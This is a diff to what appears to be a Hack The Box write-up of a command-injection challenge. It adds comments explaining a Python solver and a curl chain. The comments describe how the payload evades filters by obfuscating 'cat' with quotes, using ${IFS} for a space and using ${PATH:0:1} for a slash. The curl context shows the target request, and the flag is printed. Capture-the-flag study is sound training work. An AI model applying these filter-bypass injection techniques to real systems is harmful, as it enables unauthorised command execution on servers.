@@ -78,6 +78,7 @@ import re
 flag = re.search(r"HTB\{[^}]+\}", r.text)
 print(flag.group(0) if flag else r.text[:500])
 ```
+> Logs in as guest to get a session cookie, then triggers the move operation with the injection payload in `to=`. The payload uses quote obfuscation for `cat`, `${IFS}` for space, and `${PATH:0:1}` for `/`. The regex extracts the flag from the HTML response.
 
 ### Equivalent curl
 ```bash
@@ -90,6 +91,7 @@ curl -sk -b /tmp/c.txt -G "http://154.57.164.73:31305/index.php" \
   --data "from=2198326775.txt&finish=1&move=1" \
   | grep -oE 'HTB\{[^}]+\}'
 ```
+> Three-step curl chain: save a session cookie, POST login credentials into the cookie jar, then inject via the move endpoint. `--data-urlencode` handles shell special characters in the payload. `grep -oE` extracts just the flag string.
 
 **Flag:** `HTB{c0mm4nd3r_1nj3c70r}`
 
